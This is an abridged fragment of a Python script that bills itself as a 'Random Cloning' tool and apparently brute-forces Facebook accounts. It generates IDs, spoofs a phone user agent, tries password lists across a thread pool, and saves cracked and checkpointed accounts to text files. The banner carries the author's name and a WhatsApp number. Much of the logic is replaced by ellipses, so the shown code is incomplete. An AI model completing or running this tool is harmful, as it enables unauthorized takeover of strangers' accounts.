...
for xd in range(10000):
    ...
    c='Nokia C20 Plus Build/RP1A.201005.001'
...
os.system("espeak \"Wall come To Ridoy Bot Tools, Bangladesh Random Cloning Start Please Wait\"")
logo = ("""\033[0;92m                                  
 /$$$$$$$$                           
| $$_____/                           
| $$    /$$    /$$ /$$$$$$  /$$$$$$$ 
...
\033[1;91m[\033[1;97m+\033[1;91m]\033[1;92m CREATED BY   ➠  \033[1;33mEvan 
\033[1;91m[\033[1;97m+\033[1;91m]\033[1;92m ON FACEBOK   ➠  \033[1;34mMD Evan  KHAN ( BLANK ) 
\033[1;91m[\033[1;97m+\033[1;91m]\033[1;92m ON GITHUB    ➠ \033[1;35m Evan -BOT
\033[1;91m[\033[1;97m+\033[1;91m]\033[1;92m WHATSAPP     ➠  \033[1;36m+8801752358340
\033[1;91m[\033[1;97m+\033[1;91m]\033[1;92m TOOL VIRSION ➠ \033[1;36m 1.0.1 
\033[1;32m================================================""")
...
def asha():
    ...
    with ThreadPool(max_workers=30) as raifa:
        ...
        print('[+] Save As /sdcard/Evan -ok.txt')
        print('[~] Save As /Sdacrd/Evan -cp.txt')
...
def sabina(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r\033[m[Evan ] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
            sys.stdout.flush()
